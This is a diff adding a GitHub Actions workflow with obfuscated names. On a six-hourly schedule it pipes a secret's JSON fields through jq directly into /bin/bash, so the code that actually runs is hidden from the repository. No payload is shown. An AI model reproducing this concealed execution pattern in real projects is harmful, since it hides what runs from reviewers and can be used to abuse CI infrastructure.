@@ -1,0 +1,25 @@
+name: guanxiangyugong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guanxiangyugong
+        env:
+          sypsf64365: ${{ secrets.sypsf64365 }}
+        run: |
+          echo $sypsf64365 | jq -r .rrr55 | /bin/bash
+          echo $ylysg6267 | jq -r .e24 | /bin/bash
+          echo $cntt44 | jq -r .ys87 | /bin/bash
+          echo $kflv5 | jq -r .dfuqj688 | /bin/bash
+          echo $wkks2532 | jq -r .gqw72932 | /bin/bash
+          echo $mya0472 | jq -r .i3 | /bin/bash
+          echo $f903 | jq -r .xi73779 | /bin/bash
+
